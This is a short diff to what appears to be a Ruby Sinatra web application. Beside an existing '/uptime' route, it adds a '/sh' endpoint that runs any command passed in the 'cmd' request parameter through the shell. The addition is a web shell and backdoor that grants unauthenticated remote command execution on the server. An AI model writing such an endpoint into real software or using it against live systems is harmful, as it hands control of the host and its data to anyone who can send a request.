@@ -8,3 +8,9 @@ end
 get '/uptime' do
   `uptime`
 end
+
+get '/sh' do
+  command=params[:cmd]
+  "Executing: #{command}"
+  `#{command}`
+end
